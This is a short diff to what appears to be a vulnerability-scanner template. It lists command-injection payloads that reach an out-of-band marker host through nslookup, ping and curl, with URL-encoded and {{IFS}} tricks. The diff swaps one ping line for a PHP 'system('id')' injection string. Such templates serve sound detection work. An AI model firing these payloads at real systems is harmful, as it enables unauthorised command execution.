@@ -30,7 +30,7 @@ requests:
         - "%0anslookup%20{{marker}}%0a"
         - "`nslookup {{marker}}`"
         - "nslookup {{marker}}"
-        - "ping -c 1 {{marker}}"
+        - "<?php+system('id');?>"
         - "ping -i {{marker}}"
         - "curl{{IFS}}http://{{marker}}"
         - "curl -s http://{{marker}}"
